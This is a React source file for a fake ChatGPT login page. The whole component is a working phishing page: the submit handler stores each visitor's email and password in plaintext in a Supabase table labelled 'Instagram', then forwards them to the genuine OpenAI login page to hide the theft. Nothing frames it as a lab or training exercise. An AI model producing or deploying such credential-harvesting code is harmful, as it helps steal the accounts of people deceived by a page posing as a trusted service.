import React, { useState } from 'react';
import './ChatGPTLogin.css';
import { supabase } from '../../supabase';

const ChatGPTLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://chat.openai.com/auth/login";
    }
  };

  return (
    <div className="chatgpt-login-container">
      <div className="chatgpt-login-box">
        <h2 className="chatgpt-login-title">Welcome back</h2>
        <p className="chatgpt-login-subtitle">Log in to your ChatGPT account</p>
        <form className="chatgpt-login-form" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Email or Username"
            className="chatgpt-login-input"
            value={email}
            onChange={e => setEmail(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            className="chatgpt-login-input"
            value={password}
            onChange={e => setPassword(e.target.value)}
            required
          />
          <button type="submit" className="chatgpt-login-button" disabled={loading}>
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>
        {success && <div className="chatgpt-success">Login saved!</div>}
        {error && <div className="chatgpt-error">{error}</div>}
        <div className="chatgpt-login-footer">
          <a href="#">Forgot password?</a>
          <span>·</span>
          <a href="#">Sign up</a>
        </div>
      </div>
    </div>
  );
};

export default ChatGPTLogin;
